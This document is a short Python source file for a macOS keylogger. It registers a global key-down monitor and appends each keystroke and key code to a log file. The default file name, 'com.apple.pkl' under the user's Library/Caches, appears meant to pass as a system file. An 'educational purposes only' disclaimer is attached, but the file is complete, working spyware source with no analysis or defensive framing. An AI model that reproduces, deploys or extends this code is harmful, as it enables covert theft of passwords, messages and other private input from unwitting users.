#!/usr/bin/env python
'''
pkl.py
:author: Andrew Scott
:date: 9-3-2018

If executed successfully this script will log key strokes until the process is killed.
This script is for EDUCATIONAL PURPOSES ONLY. 
'''

import os, sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from ConfigParser import SafeConfigParser
from AppKit import NSApplication, NSApp
from Foundation import NSObject
from Cocoa import NSEvent, NSKeyDownMask
from PyObjCTools import AppHelper


parser = SafeConfigParser()
try:
    parser.read('.src/p.ini')
    SEPARATOR = parser.get('p','sep') or ','
    DIRECTORY = parser.get('p','dir') or '/Library/Caches'
    FILENAME = parser.get('p','filename') or 'com.apple.pkl'
    FALLBACK = parser.get('p','fallback') or '/'
except:
    SEPARATOR = ','
    DIRECTORY = '/Library/Caches'
    FILENAME = 'com.apple.pkl'
    FALLBACK = '/'

class AppDelegate(NSObject):
    '''
    The App Delegate creates a mask to detect the key being pressed and adds
    a global monitor for this mask.
    '''
    def applicationDidFinishLaunching_(self, notification):
        mask_down = NSKeyDownMask
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask_down, key_handler)

class Writer:
    '''
    This class contains the methods necessary to create an output file and write
    the collected keystrokes to that file.
    '''
    def __init__(self):
        self.path = self.create_log()
        self.leng = 0

    def get_target_directory(self):
        try:
            if os.getlogin():
                return '/Users/{}{}'.format(os.getlogin(), DIRECTORY)
            return FALLBACK
        except:
            return FALLBACK

    def create_log(self):
        dir = self.get_target_directory()
        filepath = os.path.join(dir, FILENAME)
        f = open(filepath, 'w+')
        f.close()
        return filepath

    def write_to_log(self, value_char, value_raw):
        self.leng += 1
        with open(self.path, 'a') as f:
            f.write('{}{}{}\n'.format(value_char, SEPARATOR, value_raw))

w = Writer()

def key_handler(event):
    '''
    Translates the key press events into readable characters if one exists
    the key code is also recorded for non-character input.
    '''
    try:
        capture_char = event.characters()
        capture_raw = event.keyCode()
        w.write_to_log(capture_char, capture_raw)
    except KeyboardInterrupt:
        AppHelper.stopEventLoop()

if __name__ == '__main__':
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()